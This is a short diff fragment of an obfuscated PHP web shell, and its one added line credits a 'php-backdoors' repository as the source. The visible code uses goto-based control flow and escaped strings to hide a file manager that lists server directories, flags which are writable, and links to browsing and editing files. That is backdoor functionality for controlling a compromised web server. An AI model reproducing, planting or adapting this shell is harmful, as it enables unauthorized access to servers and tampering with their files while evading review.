@@ -1,4 +1,4 @@
-<?php
+<?php // from https://github.com/1337r0j4n/php-backdoors
  goto jftpU; XlRbQ: foreach (array_merge($dirs, $files) as $path) { $d = is_dir($path); $w = is_writable($path); ?>
 <tr><td class="<?php  echo ($d ? "\144\151\x72\145\x63\x74\x6f\x72\x79" : "\146\151\x6c\145") . "\40" . ($w ? "\167\x72\151\x74\141\x62\154\145" : "\x6e\x6f\164\167\x72\x69\164\x61\x62\x6c\x65"); ?>
 "><a href="?<?php  echo $d ? "\x64\x69\162\x3d" . e($path) . '' : "\x66\151\154\145\75" . e($path) . "\x26" . $edir; ?>
